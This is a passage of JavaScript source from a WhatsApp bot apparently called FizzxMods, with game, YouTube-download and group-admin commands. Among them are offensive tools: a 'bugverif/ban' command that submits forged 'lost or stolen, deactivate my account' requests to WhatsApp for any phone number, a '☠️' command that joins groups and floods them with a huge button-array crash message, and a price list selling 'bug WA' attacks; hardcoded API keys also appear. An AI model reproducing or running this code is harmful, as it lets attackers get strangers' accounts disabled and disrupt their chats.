 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { reply("Incorrect Format!") }
 }
 break
 case 'heal':{
 if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break 
 case 'hunt': case 'hunting': case'berburu':{
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './baseikal/gambarnye/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./baseikal/gambarnye/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './baseikal/gambarnye/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './baseikal/gambarnye/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './baseikal/gambarnye/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './baseikal/gambarnye/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟 Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔 Ayam* : ${ayam}\n`
teksehmazeh += `*🐇 Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑 Domba* : ${domba}\n`
teksehmazeh += `*🐄 Sapi* : ${sapi}\n`
teksehmazeh += `*🐘 Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
 let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Berburu Lagi ️🏹'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: image },
 caption: teksehmazeh,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
rixx.sendMessage(from, buttonMessage, { quoted: m }) 
}, 5000)
 setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
// # BATAS # \\
//=================================================//
//=================================================//
case 'emojimix2': {
if (!text) throw `Example : ${prefix+command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await rixx.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
	
break
case 'ytplay': {

if (!text) throw `Example : ${prefix+command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: rixx.user.name,
buttons: buttons,
headerType: 4
}
rixx.sendMessage(m.chat, buttonMessage, { quoted: hw })
}
break
//=================================================//
  break
case 'ytmp4':
case 'ini_videonya':{
	if (!text) return `Example : ${prefix+command} link yt`
	let nomeruuser = `${sender.split('@')[0]}`
var ytmp4 = await fetchJson(`https://saipulanuar.ga/api/download/ytmp4?url=${text}&apikey=jPHjZpQF`)
var xx = ytmp4.result
reply(`_Video Dikirim Melalui Chat Pribadi_\nMohon Tunggu Sebentarr ! wa.me/6289636120564._`)
rixx.sendMessage(`${nomeruuser}@s.whatsapp.net`, {video:{url:xx.url}, caption:'Done!'}, {quoted:fgclink})
}
break
case 'ytmp3':
case 'ini_musiknya':{
	if (!text) return `Example : ${prefix+command} link yt`
	let nomeruser = `${sender.split('@')[0]}`
var ytmp3 = await fetchJson(`https://saipulanuar.ga/api/download/ytmp3?url=${text}&apikey=jPHjZpQF`)
var xx = ytmp3.result
m.reply(`_Audio Dikirim Melalui Chat Pribadi_\nMohon Tunggu Sebentarr ! wa.me/6289636120564._`)
m.reply(`Oke Sebentar Yaa...`)
/*rixx.sendMessage(m.chat, {audio:{url:xx.url}, mimetype:'audio/mp4', fileName: `${xx.title}.mp3`}, {quoted: fgclink2})*/
rixx.sendMessage(sender, { audio: {url:xx.url} , mimetype: 'audio/mp4', ptt: true ,fileName: `${xx.title}.mp3` , contextInfo:{forwardingScore: 9999,isForwarded: true, "externalAdReply": {"title": `FizzxMods 🔥`,"body": `SendVnWithAudio`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://chat.whatsapp.com/I4PXxNScx9WAmp5r4np6Is`}}} ,{quoted: fgclink2 })
}
  break
case 'yts': case 'ytsearch':
case 'play': {
	if (!m.isGroup) throw mess.group
  /*reply(`_List Download Akan Dikirim Melalui Chat Pribadi_\nMohon Tunggu Sebentarr ! wa.me/6289636120564._`)*/
  if (!text) return `Example : ${prefix+command} story wa anime`
  let yts = require("yt-search")
  let search = await yts(text)
  let teks = 'Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
 /* rixx.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: fkontak })*/
let sections = [] 
for (let i of search.all) {
	hasildata = `🔢 No : ${no++}
🎞️ Type : ${i.type}
📀 Video ID : ${i.videoId}
📄 Title : ${i.title}
👁️ Views : ${i.views}
👁️ Duration : ${i.timestamp}
📤 Upload : ${i.ago}
👨‍🎤 Author : ${i.author.name}
🔗 Url : ${i.url}`
const list = {title: `${i.timestamp}`,
rows: [
{
 title: `${i.title}`, 
 rowId: `ytmp3 ${i.url}`,
 description: `${i.author.name}`
}, 
]
}
sections.push(list) 
}
const sendm =rixx.sendMessage(
 m.chat, 
 {
text: `\n\n*YOUTUBE SEARCH*`,
footer: `\n*Search Results From ${text}*\n`,
title: `Hasil Data Di Temukan Silahkan Pilih Result Yang Akan Di Download !!`,
buttonText: "CLICK HERE",
sections
 }, { quoted : fgclink2 })
  }
  break
break
case 'setnamabot': case 'setnamebot': {
            if (!text) throw `Example : ${prefix+command} WhatsApp ✅`
            let name = await rixx.updateProfileName(text)
           reply(`Successfully renamed bot to ${name}`)
            }
            break
            case 'setstatus': case 'setbiobot': case 'setbotbio': {
            if (!text) throw `this is a WhatsApp Bot named FizzxMods`
            let name = await rixx.updateProfileStatus(text)
            reply(`Successfully changed bot bio status to ${name}`)
            }
            break
//=================================================//

case 'kick': {
if (!isGroup) throw `Gak bisa disini`
if (!isBotAdmins) throw `Jadiin gw admin dong biar bisa`
if (!isAdmins) throw `luh siape`
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rixx.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'restart':{
 if (!isGroup) return m.reply(`wajib dalam grup`)
if (!isGroupAdmins) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
        txts = `WAIT TUNGGU`
        m.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'sewa':
textsewa = `
╔══════[ 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 ]══════⊱
╠➤ ᴍᴜʀɪᴅ ʙᴜɢ ᴡᴀ 𝟷𝟻ᴋ
╠➤ sᴇᴡᴀ ʙᴏᴛ 𝟷ʙʟɴ 𝟻𝟶ᴋ
╠➤ ᴊᴅɪ ʙᴏᴛ ᴘᴇʀᴍᴀɴᴇɴ 𝟷??𝟶ᴋ
╠➤ sᴄ? 𝟷𝟶𝟶ᴋ
╠➤ wa.me/6285172200670
╚════[ *FizzxMods* ]══════⊱
`
m.reply(textsewa)
break
case 'test':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
m.reply(respon)
}
break
// ADD/DEL AKSES //
case 'mysesi':case 'sendsesi':case 'session':
 if (!isDev) return m.reply("Khusus Developer bot !!")
let ini_nama_sessionya = 'session'
var anumu = await fs.readFileSync(`./${ini_nama_sessionya}.json`)
reply(`*Note :*\n_Session Bot Bersifat Untuk Pribadi Dari Owner Maupun Bot, Tidak Untuk User Bot Ataupun Pengguna Bot._`)
reply(`_Document DiKirim Melalui Pribadi Chat_\n_Nama Session : ${ini_nama_sessionya}.json_\n_Mohon Tunggu Sebentar..._`)
await sleep(10000)
 rixx.sendMessage(`6285172200670@s.whatsapp.net`, { document: anumu, mimetype: 'document/application', fileName: 'session.json'}, {quoted: m } )
break
case 'delakses':
    if (!isGroup) return m.reply(`wajib dalam grup`)
if (!isGroupAdmins) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
        if (!isDev) return m.reply("Khusus Developer bot !!")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} @user`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case 'addakses':
if (!isDev) return m.reply("Khusus Developer bot !!")
 if (!isGroup) return m.reply(`wajib dalam grup`)
if (!isGroupAdmins) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rixx.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'listakses':
			teks = '*List Akses:*\n\n'
					for (let awokwkwk of owner) {
						teks += `- ${awokwkwk}\n`
					}
		anjay(teks)
					break
// BUG VERIF //
case 'bugverif': case 'bye': case 'ban': case '🐣': {
	if (!isDev) return m.reply(`Khusus Pemilik Bot, Lu siapa emg?`)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
// INI BUG GRUP //


  case "☠️":{
   if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
m.reply(`otw bos`)
if (!q) return reply(`Penggunaan ${prefix+command} link`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "5"
for (let i = 0; i < jumlah; i++) {
let kir = await rixx.groupAcceptInvite(result)
rixx.sendMessage(kir, {
text: 'BUG BY FizzxModss', 
templateButtons: [
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
